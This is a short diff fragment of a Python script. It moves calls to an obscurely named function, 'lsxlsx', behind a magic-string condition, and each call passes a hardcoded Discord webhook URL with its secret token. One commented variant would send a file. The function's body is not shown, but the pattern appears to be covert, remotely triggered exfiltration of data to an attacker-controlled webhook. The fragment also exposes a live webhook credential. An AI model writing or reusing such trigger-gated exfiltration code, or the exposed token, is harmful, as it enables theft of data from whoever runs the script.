@@ -203,9 +203,9 @@ def lsxlsx(webhook_url, file_to_send=None):
     else:
         print(f"")
 
-lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+#lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
 if file_contentsx1=="dflCLzWZeuN9D":
-    #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
+    lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR")
     #lsxlsx("https://discord.com/api/webhooks/1198603269187059793/PCT0PcR8xeRMspeAK_YrwWxO81D-SmJPhKROfUgvWe-FOK7CbjX3KC_2W_s08vM_pPFR", file_to_send="aaaaa.jpg")
 
 if file_contentsx1=="uSDKdEt8VddC8":
